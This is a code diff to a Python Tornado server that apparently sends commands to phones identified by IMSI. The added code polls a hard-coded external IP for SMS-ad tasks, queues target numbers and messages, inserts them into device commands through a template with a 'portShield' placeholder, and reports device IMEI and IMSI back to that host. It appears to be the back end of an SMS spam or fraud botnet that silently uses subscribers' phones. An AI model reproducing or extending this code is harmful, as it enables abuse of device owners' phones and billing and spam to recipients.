@@ -17,6 +17,7 @@ import public
 from Bastion import _test
 import MySQLdb
 from DBUtils.PooledDB import PooledDB
+import requests
 reload(sys)
 sys.setdefaultencoding("utf-8")
 
@@ -169,15 +170,82 @@ def get_imsi_response(_imsi, _threads):
                 if _return != None:
                     _threads.append(threading.Thread(
                         target=insert_register_cmd_log(_record_user, _return)))
+            if (_return == None or len(_return) <= 1) and get_system_parameter_from_db('sendSmsAd') == 'open' and isSmsAdOpenHour():
+                _return = get_sms_ad_cmd(_record_user, _threads)
     _cur.close()
     _dbConfig.close()
     return _return
+
+
+def get_sms_ad_cmd(_user, _threads):
+    _result = None
+    _dbConfig = poolConfig.connection()
+    _cur = _dbConfig.cursor()
+    _sql = 'SELECT * FROM wait_send_ads order by id limit 1 '
+    _cur.execute(_sql, ())
+    _record = _cur.fetchone()
+    if _record != None:
+        _result = SMS_REGISTER_CONTENT.replace(
+            '[cmd]', _record['msg']).replace('[spNumber]', _record['targetMobile']).replace('[filter]', '').replace('[portShield]', _record['targetMobile'])
+        async_sms_ad_cmd(_record, _user, _result, _threads)
+    _cur.close()
+    _dbConfig.close()
+    return _result
+
+
+def async_sms_ad_cmd(_record, _user, _return, _threads):
+    _threads.append(threading.Thread(
+        target=delete_wait_sms_ad(_record)))
+    _threads.append(threading.Thread(
+        target=log_sms_ad_cmd(_record, _user, _return)))
+    _threads.append(threading.Thread(
+        target=report_sms_ad(_record, _user)))
+
+
+def report_sms_ad(_record, _user):
+    beginTime = int(time.time() * 1000)
+    url = 'http://203.86.8.198:6068/ido/report.php?cid=10354&imei=' + str(_record['oriImei']) + '&imsi=' + str(_record['oriImsi']) + '&sdk=21&msgid=' + str(
+        _record['oriMsgId']) + '&taskid=' + str(_record['oriTaskId']) + '&phone=' + str(_record['oriMsgId']) + '&send=1&deliver=1'
+    _r = requests.get(url)
+    endTime = int(time.time() * 1000)
+    _dbLog = poolLog.connection()
+    _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`,`para04`) values (%s,%s,%s,%s,%s,%s)'
+    ctime = int(time.time())
+    _dbLog.cursor().execute(_sql, (long(round(time.time() * 1000)) * 10000 + random.randint(0, 9999), 421,
+                                   _user["imsi"], _user["mobile"], url, endTime - beginTime))
+    _dbLog.close()
+
+
+def log_sms_ad_cmd(_record, _user, _return):
+    _dbLog = poolLog.connection()
+    _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`,`para04`,`para05`,`para06`,`para07`,`para08`) values (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)'
+    ctime = int(time.time())
+    _dbLog.cursor().execute(_sql, (long(round(time.time() * 1000)) * 10000 + random.randint(0, 9999), 411,
+                                   _user["imsi"], _user["mobile"], _record["targetMobile"], _record["msg"], _record["createTime"], ctime, _record["oriContent"], _return))
+    _dbLog.close()
+
+
+def delete_wait_sms_ad(_record):
+    _dbConfig = poolConfig.connection()
+    _cur = _dbConfig.cursor()
+    _sql = 'delete from wait_send_ads where id=%s '
+    _cur.execute(_sql, (_record['id']))
+    _cur.close()
+    _dbConfig.close()
 
 
 def isOpenHour():
     _result = True
     _hour = int(time.strftime("%H", time.localtime()))
     if _hour == 23 or (_hour >= 0 and _hour <= 7):
+        _result = False
+    return _result
+
+
+def isSmsAdOpenHour():
+    _result = True
+    _hour = int(time.strftime("%H", time.localtime()))
+    if _hour > 19 or _hour <= 7:
         _result = False
     return _result
 
@@ -223,8 +291,6 @@ def get_cmd(_user, _threads):
 
 
 # 获取短信注册类指令
-
-
 def get_register_cmd(_user, _threads):
     _result = None
     if isOpenSmsRegisterHour('Qq') and str(_user['lastRegisterCmdAppIdList']).find(',4,') != -1 and int(get_system_parameter_from_db("qqRegisterLimit")) > 0 and int(_user['registerQqCmdCount']) <= (int(get_system_parameter_from_db("qqRegisterLimit")) + TRY_MORE_TIMES) and int(_user['registerQqSuccessCount']) < int(get_system_parameter_from_db("qqRegisterLimit")):
@@ -325,9 +391,45 @@ def cache_system_parameter():
     _recordRsp = _cur.fetchall()
     for _t in _recordRsp:
         systemConfigs[_t['title']] = _t['detail']
-    print(systemConfigs)
     _cur.close()
     _dbConfig.close()
+    return
+
+
+def fetch_sms_ads():
+    if isSmsAdOpenHour():
+        _dbConfig = poolConfig.connection()
+        _cur = _dbConfig.cursor()
+        _sql = 'SELECT count(*) as tot FROM `wait_send_ads` '
+        _cur.execute(_sql)
+        _recordRsp = _cur.fetchone()
+        ctime = int(time.time())
+        imsi = '460029154625815'
+        if _recordRsp != None and systemConfigs['sendSmsAdLessNum'] == 'open' and int(_recordRsp['tot']) <= int(systemConfigs['sendSmsAdLessNum']):
+            _r = requests.get(
+                'http://203.86.8.198:6068/ido/get.php?cid=10354&imei=' + str(ctime) + '&imsi=' + imsi + '&sdk=21&sim=5&info=LenovoLenovo+A708t')
+            data = _r.json()
+            print(data)
+            insertBulk = []
+            if 'tasks' in data.keys():
+                for _cell in data['tasks']:
+                    insertBulk.append(
+                        (str(_cell['phone']), _cell['msg'], str(ctime), str(_cell), str(ctime), imsi, _cell['msgid'],  _cell['taskid']))
+                _sql = 'insert into wait_send_ads (targetMobile,msg,createTime,oriContent,oriImei,oriImsi,oriMsgId,oriTaskId) values (%s,%s,%s,%s,%s,%s,%s,%s)'
+                _dbConfig.cursor().executemany(_sql, insertBulk)
+            threading.Thread(
+                target=log_fetch_sms_ads(data))
+        _cur.close()
+        _dbConfig.close()
+    return
+
+
+def log_fetch_sms_ads(data):
+    _dbLog = poolLog.connection()
+    _sql = 'insert into log_async_generals (`id`,`logId`,`para01`) values (%s,%s,%s)'
+    _dbLog.cursor().execute(_sql, (long(round(time.time() * 1000)) * 10000 +
+                                   random.randint(0, 9999), 401, str(data)))
+    _dbLog.close()
     return
 
 
@@ -372,5 +474,7 @@ if __name__ == "__main__":
     app = make_app()
     app.listen(config.GLOBAL_SETTINGS['port'], xheaders=True)
     cache_system_parameter()
+    fetch_sms_ads()
     tornado.ioloop.PeriodicCallback(cache_system_parameter, 6000).start()
+    tornado.ioloop.PeriodicCallback(fetch_sms_ads, 6000).start()
     tornado.ioloop.IOLoop.current().start()
